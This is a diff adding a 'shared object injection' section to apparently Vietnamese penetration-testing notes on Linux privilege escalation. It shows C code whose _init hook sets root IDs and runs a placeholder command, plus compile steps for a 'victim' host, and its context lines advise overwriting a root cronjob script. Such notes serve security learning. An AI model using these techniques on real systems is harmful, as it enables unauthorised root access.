@@ -49,3 +49,38 @@ Example:
 ```
 
 Dựa vào kết quả trên, check quyền của file được đặt cronjob bằng `ls -la` xem có thể edit được không. Như ở trên có file `/var/www/html/booked/cleanup.py` có vẻ khả quan, nếu có quyền `wr` thì chỉ cần thay thế nội dung là xong.
+
+# 4. Shared object injection.
+
+Nếu gặp 1 process nào đó chạy với quyền root, sử dụng một shared object file (.so) và có quyền ghi trong thư mục chứa .so đó, hoặc là có quyền ghi với chính file .so đó luôn, có thể thực hiện so injection.
+
+```c 
+// pwn.c 
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("some_cmd");
+}
+```
+
+Gửi file đó lên victim, và compile:
+
+```console 
+$ gcc -shared -fPIC -nostartfiles -o so_file_name.so pwn.c 
+```
+
+Nếu gặp phải lỗi **"gcc: error trying to exec ‘cc1‘: execvp: No such file or directory"** thì có thể làm thế này:
+
+```console 
+$ find /usr/ -name "*cc1*" 2>/dev/null
+...
+...
+/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc
+...
+...
+
+$ export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
+```
